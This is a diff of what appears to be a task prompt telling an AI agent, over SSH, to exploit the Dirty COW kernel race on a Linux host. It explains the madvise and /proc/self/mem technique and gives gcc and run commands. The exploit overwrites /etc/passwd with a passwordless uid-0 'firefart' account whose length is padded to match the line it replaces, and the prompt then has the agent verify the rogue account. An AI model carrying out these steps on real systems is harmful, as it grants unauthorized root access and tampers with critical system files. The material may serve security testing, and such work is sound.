@@ -273,7 +273,17 @@ be vulnerable to Dirty COW. Do NOT assume it's there — discover it from the bo
 Your shell state does NOT persist between calls over SSH, so do each of the
 following as a SEPARATE `execute_command` call, writing to and reading from disk
 rather than relying on cwd or env vars carrying over:
-1. Write the PoC source to disk:
+1. BACK UP the line you are about to overwrite, BEFORE touching anything.
+   Dirty COW does not append — it overwrites existing bytes in place — so you
+   need the original bytes on record in case the race misfires:
+   grep '^root:' /etc/passwd
+2. Write the canonical "firefart" PoC source to disk (standard public
+   dirtyc0w.c technique): mmap the target file read-only+private, then race
+   two threads — one spamming madvise(MADV_DONTNEED) to keep discarding the
+   clean page, the other seeking /proc/self/mem to the mapped address and
+   writing your replacement bytes — so the kernel's copy-on-write path loses
+   the race and the write lands on the underlying file instead of a private
+   copy:
    cat > /tmp/dc.c << 'EOF'
    #include <stdio.h>
    #include <stdlib.h>
@@ -336,14 +346,24 @@ rather than relying on cwd or env vars carrying over:
      return 0;
    }
    EOF
-2. Compile it: gcc -pthread /tmp/dc.c -o /tmp/dc
-3. Run the exploit so the race overwrites the start of /etc/passwd with a rogue
-   uid=0 account. Use `$'...\\n'` (ANSI-C quoting) so the argument carries a REAL
-   newline, and an EMPTY password field so the account is directly usable:
-   /tmp/dc /etc/passwd $'firefart::0:0:pwned:/root:/bin/bash\\n'
-4. VERIFY the rogue account actually exists at uid 0 — this verification, not a
+3. Compile it: gcc -pthread /tmp/dc.c -o /tmp/dc
+4. Run the exploit. CRITICAL: Dirty COW overwrites bytes in place — it CANNOT
+   grow the file — so your replacement must be EXACTLY as many bytes as the
+   line you are overwriting, including the trailing newline, or you corrupt
+   whatever follows it. Use an EMPTY password field (no shadow entry needed)
+   and pad the GECOS/comment field with filler characters to absorb the length
+   difference from a longer username. Example: the standard
+   `root:x:0:0:root:/root:/bin/bash\\n` line is 32 bytes; swapping in a
+   `firefart` account with an empty password and a 1-byte comment —
+   `firefart::0:0:p:/root:/bin/bash\\n` — is ALSO exactly 32 bytes. Measure
+   YOUR target line's actual length (from step 1) before assuming this exact
+   padding applies to your box. Use `$'...\\n'` (ANSI-C quoting) so the
+   argument carries a REAL newline:
+   /tmp/dc /etc/passwd $'firefart::0:0:p:/root:/bin/bash\\n'
+5. VERIFY the rogue account actually exists at uid 0 — this verification, not a
    login, IS your proof of root-equivalent compromise (your SSH session has no
-   tty, so switching user into the new account cannot work here):
+   tty, so switching user into the new account cannot work here). Also confirm
+   /etc/passwd is still well-formed (neighboring lines intact, nothing split):
    grep '^firefart:' /etc/passwd
    id firefart
 """
